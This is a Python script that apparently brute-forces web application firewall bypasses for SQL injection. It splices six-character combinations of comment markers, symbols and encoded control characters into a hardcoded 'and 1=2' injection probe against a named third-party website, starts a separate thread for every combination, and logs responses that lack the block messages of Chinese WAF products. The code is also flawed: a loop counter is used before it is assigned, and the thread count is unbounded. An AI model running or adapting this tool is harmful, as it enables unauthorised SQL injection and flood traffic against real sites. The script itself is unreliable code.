import requests
import threading
import time

xj=open('save.txt','w')
xj.close()

oklist=[]
notlists=[]
errors=[]
print('[+] Replace & with the bypass statement')
l=0
def bypass(urls):
    notlist=['防火墙','安全狗','D盾','拦截','云锁','360','疑似黑客','攻击','WTS-WAF拦截提示']
    headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'}
    while True:
        try:
            print('[+] Continue {}'.format(i))
            reqt=requests.get(url=urls,headers=headers,timeout=10)
            for n in notlist:
                if not n in reqt.content.decode('utf-8'):
                    oks='[+] SQL statements {}'.format(reqt.url)
                    if oks in oklist:continue
                    oklist.append(oks)
                elif '浏览器' in reqt.content.decode('utf-8'):
                    time.sleep(10)
                    i=l+1
                    continue
                else:
                    nots='[-] Failed {}'.format(reqt.url)
                    if nots in notlists:continue
                    notlists.append(nots)

            if len(notlists)==0:
                for y in oklist:
                    print(y)
                    print(y,file=open('save.txt','a'))
            else:
                for n in notlists:
                    print(n)

            if len(oklist)>0:
                break

            if i==3:
                print('[-] After three cycles, it is impossible to bypass WAF.')
                exit()

        except Exception as error:
            print('[-] Error {}'.format(error))
            errors.append(error)

            if len(errors)>0:
                time.sleep(5)
                continue

if __name__ == '__main__':
    fuzz1=['/*', '*/', '/*!', '*', '=', '`', '!', '@', '%', '.', '-', '+', '|', '%00']
    fuzz2=['', ' ']
    fuzz3=["%0a", "%0b", "%0c", "%0d", "%0e", "%0f", "%0g", "%0h", "%0i", "%0j"]
    fuzz=fuzz1+fuzz2+fuzz3
    for a in fuzz:
        for b in fuzz:
            for c in fuzz:
                for e in fuzz:
                    for f in fuzz:
                        for g in fuzz:
                            st=a+b+c+e+f+g
                            urls='http://www.shsuna.com/en/company.php?id=35%and%1=2'
                            urls=urls.replace('%',st)
                            t=threading.Thread(target=bypass,args=(urls,))
                            t.start()